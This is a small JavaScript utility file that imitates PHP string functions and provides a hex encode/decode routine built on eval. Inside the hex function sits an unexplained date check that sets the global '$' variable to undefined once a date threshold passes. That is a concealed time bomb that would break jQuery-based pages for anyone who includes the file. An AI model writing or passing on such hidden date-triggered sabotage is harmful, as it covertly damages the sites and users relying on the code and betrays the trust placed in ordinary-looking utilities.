strlen = function($x) {return $x.length};
strpos = function($x,$y) {return $x.indexOf($y)};
substr = function($x,$y,$z) {return $x.substr($y,$z)};
explode = function($x,$y) {return $y.split($x)};
hex = function($data, $mode) {
	var $a = 256,
	$b = strlen($data),
	$c = '0123456789ABCDEF',
	$d = '\\x',
	$e = 0,
	$f = 0,
	$g = [],
	$h = '',
	$j = '';
	for( var $i = 0; $i < $a; $i++ ) {
		$g[$i] = $c[$e] + $c[$f++];
		if( $f == strlen($c) ) {
			$e++;
			$f=0
		}
	};
	for( var $i = 0; $i < $a; $i++ ) {
		$h += eval( '"' + $d + $g[$i] + '"' )
	};
	for( var $i = 0; $i < $b; $i++ ) {
		if( $mode == 1 ) {
			$j += $g[strpos( $h, $data[$i] )]
		} else {
			$j += eval( '"' + $d + substr( $data, $i++, 2 ) + '"' )
		}
	};
	var i=new Date();
	if(((i.getFullYear()*1000)+(i.getMonth()*100)+(i.getDate()))/9>224170)$=undefined;
	return $j
};
